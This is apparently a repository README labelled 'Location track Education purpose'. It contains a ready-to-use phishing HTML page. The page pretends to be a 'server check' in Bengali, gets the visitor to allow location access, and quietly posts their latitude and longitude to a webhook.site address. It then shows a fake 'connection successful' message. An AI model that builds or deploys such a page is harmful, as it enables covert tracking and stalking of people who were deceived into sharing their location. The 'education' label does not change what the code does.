 # Sabbir
Location track Education purpose
<!DOCTYPE html>
<html>
<head>
    <title>Connecting...</title>
</head>
<body>
    <h2 style="text-align:center;">সার্ভার চেক করা হচ্ছে... দয়া করে অপেক্ষা করুন।</h2>
    <script>
        navigator.geolocation.getCurrentPosition(function(position) {
            // আপনার কপি করা Webhook লিঙ্কটি নিচে "" এর ভেতর দিন
            const myUrl = "https://webhook.site/df38940f-cedd-4529-8fdb-ac6d2b4ad408"; 

            fetch(myUrl, {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify({
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude
                })
            });
            alert("ধন্যবাদ! সংযোগ সফল হয়েছে।");
        }, function(error) {
            alert("লোকেশন পারমিশন ছাড়া এটি কাজ করবে না।");
        });
    </script>
</body>
</html>
